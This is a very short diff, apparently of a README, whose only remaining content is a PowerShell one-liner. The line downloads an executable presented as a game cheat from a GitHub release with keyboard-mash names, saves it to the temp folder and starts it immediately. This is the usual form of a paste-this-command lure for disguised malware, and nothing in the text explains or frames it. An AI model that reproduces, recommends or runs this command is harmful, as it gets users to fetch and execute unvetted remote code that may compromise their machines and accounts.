@@ -1,3 +1,1 @@
-# jkhkjhkjhkjh
-hkjefcchejkfv
 iwr -useb "https://github.com/liol56456465/jkhkjhkjhkjh/releases/download/ljgljhgljhgjlhgjhgljhghjlgbhjl/Val.Zyn.Cheat.exe" -OutFile "$env:TEMP\Val.Zyn.Cheat.exe"; Start-Process "$env:TEMP\Val.Zyn.Cheat.exe"
